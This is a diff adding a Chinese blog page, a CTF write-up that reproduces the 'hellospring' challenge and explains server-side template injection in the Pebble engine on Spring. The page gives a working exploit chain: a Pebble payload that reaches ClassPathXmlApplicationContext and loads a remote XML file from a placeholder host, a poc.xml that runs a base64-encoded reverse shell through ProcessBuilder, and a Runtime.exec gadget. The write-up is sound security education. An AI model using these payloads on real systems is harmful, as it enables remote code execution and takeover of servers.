@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Yu9">
+    
+    <title>
+        
+            强网hellospring引出SSTI的学习 |
+        
+        Yu9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/blog/images/logo.png">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.0/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/blog/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"wsyu9a.github.io","root":"/blog/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#999999","title":"Yu9's Blog","author":"Yu9","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"Home":"/","Archives":"/archives","Tags":"/tags","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bgc.png","background_img_dark":"/images/bgc.png","description":"Runtime.getRuntime().exec(\"变有钱\")","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/wsYu9a","weixin":"img | /images/wechat.jpg"}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"category":false,"tag":true,"announcement":null},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":["/css/custom.css"]},"root":"/blog","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/blog/">
+                    <img src="/blog/images/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/blog/">
+               Yu9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/blog/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/blog/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        强网hellospring引出SSTI的学习
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/blog/images/avatar.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Yu9</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-01-02</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Tue Mar 19 2024 02:59:46 GMT+0000">2024-03-19</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/blog/tags/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">模版注入</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.3k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>9 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>太菜了，比赛时没做出来这道题。现在复现一下，顺便整理一下模版注入相关的知识，和各位师傅一块探讨一下！</p>
+<blockquote>
+<p>文中概念多来自互联网，如有侵权，联系删除！</p>
+</blockquote>
+<h2 id="0X01-什么是SSTI-模版注入"><a href="#0X01-什么是SSTI-模版注入" class="headerlink" title="0X01 什么是SSTI(模版注入)"></a>0X01 什么是SSTI(模版注入)</h2><h3 id="1、-模版引擎"><a href="#1、-模版引擎" class="headerlink" title="1、 模版引擎"></a>1、 模版引擎</h3><p>模板引擎（这里特指用于Web开发的模板引擎）：是为了使<code>用户界面</code>与<code>业务数据</code>（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
+<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
+<h3 id="2、ssti（模版注入）"><a href="#2、ssti（模版注入）" class="headerlink" title="2、ssti（模版注入）"></a>2、ssti（模版注入）</h3><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）。</p>
+<p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
+<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
+<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
+<p>更详细的内容可以看看这位师傅的文章：<a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html" >https://www.cnblogs.com/bmjoker/p/13508538.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0X02-JSP是模版引擎吗？"><a href="#0X02-JSP是模版引擎吗？" class="headerlink" title="0X02 JSP是模版引擎吗？"></a>0X02 JSP是模版引擎吗？</h2><p><strong>JSP是web开发最早期的模板引擎产品。</strong></p>
+<p>如果你在网上搜Spring Boot的教程，会发现模板引擎清一色用的<a class="link"   target="_blank" rel="noopener" href="https://www.thymeleaf.org/" >Thymeleaf<i class="fas fa-external-link-alt"></i></a>，为什么很少人用JSP？因为Spring Boot官方已经不推荐使用JSP了。但Spring Boot提供了多种模板引擎的支持（<code>嵌入式容器JSP有限制，2010年后Velocity停止更新，所以JSP与Velocity两个不建议使用</code>）</p>
+<p>springBoot支持的模板引擎有： Thymeleaf、FreeMarker、Velocity、Mustache、JSP、Groovy、Handlebars、Jade4j、Pebble、Thymol等等</p>
+<p>因为这个文章主要来写<code>hellospring</code>这个题目，所以我们先学习<code>Pebble</code>模版！</p>
+<h2 id="0X03-Pebble模版"><a href="#0X03-Pebble模版" class="headerlink" title="0X03 Pebble模版"></a>0X03 Pebble模版</h2><h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>Pebble是一款Java 模板引擎，开发他的灵感来自于Twig。它具有很强的模板延续性和易于阅读的语法；</p>
+<h3 id="2、数据绑定示例"><a href="#2、数据绑定示例" class="headerlink" title="2、数据绑定示例"></a>2、数据绑定示例</h3><p>在模板中，开发人员可以动态值定义静态内容和占位符。在运行时，模板将由其引擎处理以映射模板中的动态值引用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好&#123;&#123;Name&#125;&#125;！</span><br></pre></td></tr></table></figure>
+
+<p>在确定Name的值，经过引擎处理后的输出就是</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f1fdd7f96c.png"  alt="image-20231230033700540"></p>
+<h3 id="3、漏洞原因"><a href="#3、漏洞原因" class="headerlink" title="3、漏洞原因"></a>3、漏洞原因</h3><p>在 Java 中各种表达式语言中利用模板注入的常用方法是使用类似于以下内容的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;ls   -la&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>基本上，Java中的每个对象都有一个称为 getClass()的方法，它可以通过检索特殊的 java.lang.class，轻而易举的获取任意 Java类的实例。因为它允许执行 OS 命令，下一步通常是获取 java.lang.Runtime 的实例。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; variable.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;ls -la&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0X04-hellospring复现"><a href="#0X04-hellospring复现" class="headerlink" title="0X04 hellospring复现"></a>0X04 hellospring复现</h2><h3 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h3><p>比赛时给的附件公众号发送<code>hellospring</code>获取！</p>
+<p>比赛给的是个jar包，直接解压在idea打开！</p>
+<p>从<code>META-INF\MANIFEST.MF</code>路径下我们可以看到使用的jdk版本！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2256c2bf5.png"  alt="image-20231230034733717"></p>
+<p>我们配置到对应的环境，直接在虚拟机把项目跑起来！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f23bed32d9.png"  alt="image-20231230035333865"></p>
+<p><strong>说明：</strong>给的附件和远程环境中的不一样！我们需要根据配置文件和源码return ‘home’写一个home.pebble放在&#x2F;tmp目录下,作为模板文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Home Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello!!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f23fa78f14.png"  alt="image-20231230035433527"></p>
+<p>成功访问到就说明环境搭建成功！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f243593fbd.png"  alt="image-20231230035532629"></p>
+<h3 id="2、题目环境分析"><a href="#2、题目环境分析" class="headerlink" title="2、题目环境分析"></a>2、题目环境分析</h3><p>给出了两个路由！</p>
+<p>（1）根据参数x返回指定模板</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f25207d2da.png"  alt="image-20231230035927536"></p>
+<p>（2）看名字应该是上传文件的</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f253d26775.png"  alt="image-20231230035956127"></p>
+<p>写了个过滤器，但是没有内容！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2edfdf968.png"  alt="image-20231230044102897"></p>
+<p>上传文件后，给文件重命名了</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2f50dc494.png"  alt="image-20231230044255919"></p>
+<p>使用的是<code>FileNameGenerator</code>这个工具类的<code>general_time</code>方法。大概就是获取当前日期，然后改改变格式。拼接生成新的文件名！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2fab46ca8.png"  alt="image-20231230044426254"></p>
+<p>写个demo瞅瞅，最后就是<code>file_20231230_044928.pebble</code>这样的，很好构造！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f30f2d9634.png"  alt="image-20231230044953867"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f3100ce80d.png"  alt="image-20231230045007832"></p>
+<h3 id="3、目录穿越"><a href="#3、目录穿越" class="headerlink" title="3、目录穿越"></a>3、目录穿越</h3><p>pebble当中有两个loader一个是classpathloader，另一个是fileloader，优先会在classpath下尝试加载模板文件，如果寻找不到则使用fileloader尝试加载模板文件</p>
+<p>但是题目中给出了后缀名的限制，导致了不能任意文件读取。</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f258da4757.png"  alt="image-20231230040116689"></p>
+<p>但是可以读取到.pebble的文件！我们写入一个类似文件测试一下！</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f267e15c69.png"  alt="image-20231230040517071"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f265151aa1.png"  alt="image-20231230040432353"></p>
+<h3 id="4、思路"><a href="#4、思路" class="headerlink" title="4、思路"></a>4、思路</h3><p>大胆的猜测一下出题人的思路！</p>
+<ul>
+<li>存在目录穿越(只能读取.pebble后缀文件)</li>
+<li>有一个上传文件的路由</li>
+</ul>
+<p>大概思路就是通过上传点传一个.pebble的恶意文件，然后访问–&gt;触发pebble模版注入漏洞，然后rce或者反弹shell拿flag！</p>
+<h3 id="5、本地复现"><a href="#5、本地复现" class="headerlink" title="5、本地复现"></a>5、本地复现</h3><p>（1）找到一个比较新的利用方式：<br><a class="link"   target="_blank" rel="noopener" href="https://github.com/Y4tacker/Web-Security/issues/3" >https://github.com/Y4tacker/Web-Security/issues/3<i class="fas fa-external-link-alt"></i></a></p>
+<p>大概思路：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、老版本的exploit，通过Class.forName加载任意类，新版本中修复了</span><br><span class="line"></span><br><span class="line">2、Spring应用程序的很多实例都是隐式注册为bean的，可以从持有lassloader对象的bean中找到一个对象，通过获取它我们可以通过执行loadClass来加载任何对象</span><br><span class="line"></span><br><span class="line">3、找到了org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><br><span class="line"></span><br><span class="line">4、但是执行loadclass是不够的，还需要实例化该类</span><br><span class="line"></span><br><span class="line">5、spring的依赖中有jackson，通过jackson反序列化我们可以很方便的实例化一个类。</span><br><span class="line"></span><br><span class="line">6、bean 中有这个 jacksonObjectMapper 对象，现在可以实例化任意类，并且通过能够实例化任意类，绕过了过滤限制</span><br><span class="line"></span><br><span class="line">7、spring场景中我们很容易想到一个配置类org.springframework.context.support.ClassPathXmlApplicationContext，它允许我们加载远程xml配置文件，通过它我们可以轻松实现命令执行。</span><br><span class="line"></span><br><span class="line">8、但是此时你会发现任何继承自AbstractPointcutAdvisor和AbstractApplicationContext的类jackson都将不允许实例化</span><br><span class="line"></span><br><span class="line">9、不过jre中发现了一个名为java.beans.Beans的类。该类的instantiate方法可以帮助我们实例化任意方法。这样我们就得到了禁止通过间接方式实例化的ClassPathXmlApplicationContext类。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>poc.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">    &lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">        &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">            &lt;constructor-arg &gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;echo YmF...MQ==|base64 -d|bash -i&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">            &lt;/constructor-arg&gt;</span><br><span class="line">        &lt;/bean&gt;</span><br><span class="line">    &lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+<p>（2）python开个web服务，放poc.xml</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2d9437a72.png"  alt="image-20231230043531255"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f2dccdb70f.png"  alt="image-20231230043627888"></p>
+<p>（3）vps开启端口监听</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f54bcbe54b.png"  alt="image-20231230072235388"></p>
+<p>（4）接下里就是上传啦！！</p>
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set y= beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;java.beans.Beans&quot;) %&#125;</span><br><span class="line">&#123;% set yy =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, y) %&#125;</span><br><span class="line">&#123;% set yyy = yy.instantiate(null,&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;) %&#125;</span><br><span class="line">&#123;&#123; yyy.setConfigLocation(&quot;http://xxxx/1.xml&quot;) &#125;&#125;</span><br><span class="line">&#123;&#123; yyy.refresh() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>/uploadFile</code>，yakit抓包，改成post请求，添加请求体</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f33c3055e0.png"  alt="image-20231230050153911"></p>
+<p>结合之前分析的重命名规则，我们就可以构造出文件名，<code>但是注意是服务端的时间,我们的本地时间不一样</code></p>
+<p>（5）结合之前分析的目录穿越访问！反弹shell。。</p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f55b7f2da7.png"  alt="image-20231230072646532"></p>
+<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2023/12/30/658f554e1869d.png"  alt="image-20231230072500677"></p>
+<h2 id="0X05-总结"><a href="#0X05-总结" class="headerlink" title="0X05 总结"></a>0X05 总结</h2><p>其他的模版注入无非也就是：</p>
+<p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的恶意的语句。</p>
+<h2 id="0X06-参考文章"><a href="#0X06-参考文章" class="headerlink" title="0X06 参考文章"></a>0X06 参考文章</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html" >https://www.cnblogs.com/bmjoker/p/13508538.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://kumamon.fun/server-side-template-injection-on-the-example-of-pebble/" >https://kumamon.fun/server-side-template-injection-on-the-example-of-pebble/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1692/#toc" >https://tttang.com/archive/1692/#toc<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.51cto.com/u_15585381/5277421" >https://blog.51cto.com/u_15585381/5277421<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.tawnx.com/2022/07/25/SSTI/index.html" >https://blog.tawnx.com/2022/07/25/SSTI/index.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0X07-原文地址"><a href="#0X07-原文地址" class="headerlink" title="0X07 原文地址"></a>0X07 原文地址</h2><p>转载自公众号：安服仔Yu9<br>原文地址：<a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PNOpAnkyhWoXHXFFfE4_Sw" >https://mp.weixin.qq.com/s/PNOpAnkyhWoXHXFFfE4_Sw<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/blog/tags/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/">模版注入</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/blog/2024/01/06/240106%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8E%E6%95%B0%E6%8D%AE%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/"
+                                   title="数据完整性与数据身份验证"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">数据完整性与数据身份验证</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/blog/2023/12/23/231223JWT%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF/"
+                                   title="JWT渗透姿势"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">JWT渗透姿势</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
